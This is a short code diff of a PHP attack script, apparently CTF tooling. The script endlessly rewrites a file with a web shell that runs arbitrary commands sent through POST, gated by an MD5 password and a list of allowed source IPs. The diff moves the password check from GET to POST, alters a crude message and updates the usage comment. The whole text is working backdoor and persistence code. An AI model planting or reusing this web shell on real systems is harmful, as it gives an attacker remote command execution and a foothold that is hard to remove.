@@ -12,17 +12,16 @@ $shell = "<?php
 \$ip=\$_SERVER['REMOTE_ADDR']; 
 foreach (\$serverList as \$host){
    if(\$ip===\$host){
-      if(@md5(\$_GET['pass'])==='250f66593905c6ebe61890ae3251435a'){
+      if(@md5(\$_POST['pass'])==='250f66593905c6ebe61890ae3251435a'){
          @eval(\$_POST[cmd]); 
       }
    }else 
-      echo \"<br>FCK U!<br>\";
+      echo \"<br>FCK OFF!<br>\";
 }
 ?>";
 while (TRUE) {
 file_put_contents($file, $shell);
 usleep(50);
 }
-//GET pass=PK
-//POST cmd=
+//post pass=PK{}&cmd=
 ?>
